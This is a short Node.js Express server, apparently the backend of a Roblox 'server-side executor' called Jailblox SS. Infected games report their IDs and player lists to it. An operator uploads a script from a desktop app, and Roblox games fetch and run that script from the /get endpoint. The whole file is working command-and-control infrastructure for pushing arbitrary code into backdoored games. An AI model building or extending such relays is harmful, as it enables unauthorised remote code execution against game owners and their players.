const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;

// Datos en memoria (usa DB para producción)
let games = {};     // { gameId: { id, name, players: [] } }
let lastScript = "";

// Ruta básica para probar servidor
app.get('/', (req, res) => {
  res.send('Servidor Jailblox SS funcionando!');
});

// Recibir reportes de juegos y jugadores (POST JSON)
app.post('/report', (req, res) => {
  const { gameId, gameName, players } = req.body;

  if (!gameId || !gameName || !Array.isArray(players)) {
    return res.status(400).json({ error: "Datos inválidos" });
  }

  games[gameId] = {
    id: gameId,
    name: gameName,
    players: players
  };

  res.json({ status: "Reporte recibido" });
});

// Devolver lista de juegos conectados
app.get('/games', (req, res) => {
  res.json(Object.values(games));
});

// Devolver lista de jugadores de un juego
app.get('/players', (req, res) => {
  const gameId = req.query.gameId;
  if (!gameId || !games[gameId]) {
    return res.json([]);
  }
  res.json(games[gameId].players);
});

// Ruta para que Roblox obtenga script a ejecutar
app.get('/get', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  res.send(lastScript || "");
});

// Recibir script para ejecutar (desde la app WPF)
app.post('/upload', (req, res) => {
  const { script } = req.body;
  if (!script || typeof script !== 'string') {
    return res.status(400).json({ error: "Script inválido" });
  }

  lastScript = script;
  res.json({ status: "Script recibido" });
});

app.listen(PORT, () => {
  console.log(`Servidor escuchando en puerto ${PORT}`);
});
